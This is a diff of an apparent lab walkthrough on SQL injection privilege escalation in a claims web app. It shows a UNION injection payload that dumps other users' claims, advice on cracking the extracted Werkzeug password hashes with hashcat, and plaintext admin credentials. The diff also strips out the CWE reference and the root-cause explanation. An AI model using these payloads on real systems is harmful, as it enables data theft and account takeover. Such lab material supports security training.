@@ -1,7 +1,5 @@
 # Privilege Escalation 2 — SQL Injection
 
-**CWE:** [CWE-89](https://cwe.mitre.org/data/definitions/89.html) — Improper Neutralisation of Special Elements used in an SQL Command ('SQL Injection')
-
 ---
 
 ## Vulnerability Summary
@@ -25,38 +23,6 @@ SELECT * FROM claims WHERE user_id = 1 AND title LIKE '%<INPUT>%' ORDER BY creat
 ```
 
 Because `<INPUT>` is inserted directly into the SQL string, an attacker can break out of the `LIKE` string and inject arbitrary SQL.
-
----
-
-## Database Schema Reference
-
-**`claims` table — 12 columns:**
-
-| # | Column             | Type     |
-|---|--------------------|----------|
-| 1 | `id`               | Integer  |
-| 2 | `user_id`          | Integer  |
-| 3 | `claim_type_id`    | Integer  |
-| 4 | `title`            | String   |
-| 5 | `description`      | Text     |
-| 6 | `amount`           | Float    |
-| 7 | `status`           | String   |
-| 8 | `additional_details` | Text   |
-| 9 | `created_at`       | DateTime |
-|10 | `updated_at`       | DateTime |
-|11 | `reviewed_by`      | Integer  |
-|12 | `review_notes`     | Text     |
-
-**`users` table — 6 columns:**
-
-| # | Column          | Type     |
-|---|-----------------|----------|
-| 1 | `id`            | Integer  |
-| 2 | `username`      | String   |
-| 3 | `email`         | String   |
-| 4 | `password_hash` | String   |
-| 5 | `role`          | String   |
-| 6 | `created_at`    | DateTime |
 
 ---
 
@@ -145,7 +111,7 @@ This places `password_hash` in the **Title** column (`row[3]`), which renders as
 
 > Note: The `password_hash` values are Werkzeug hashed passwords (e.g., `scrypt:32768:8:1$...`). Use an offline hash cracker (e.g., hashcat with mode 25600 for Werkzeug scrypt) to recover plaintext passwords.
 
-### Step 6 — Extract all claims from other users
+### Additional — Extract all claims from other users
 
 ```
 x' UNION SELECT id, user_id, claim_type_id, title, description, amount, status, additional_details, created_at, updated_at, reviewed_by, review_notes FROM claims WHERE user_id != 1 -- 
@@ -153,7 +119,7 @@ x' UNION SELECT id, user_id, claim_type_id, title, description, amount, status, 
 
 This returns claims belonging to all other users. Since both SELECTs query the same `claims` table, no type casts are needed — the column types match automatically.
 
-### Step 7 — Log in as the OIC user
+### Step 6 — Log in as the OIC user
 
 Once the OIC password hash is cracked, log in at `/login` with the recovered credentials to gain full OIC privileges.
 
@@ -162,9 +128,3 @@ Once the OIC password hash is cracked, log in at `/login` with the recovered cre
 Username: oic_admin
 Password: oic_admin_pass
 ```
-
----
-
-## Root Cause
-
-User-supplied search input is concatenated directly into a SQL string passed to `db.session.execute(db.text(raw_query))`. No parameterised queries or ORM filtering is used.
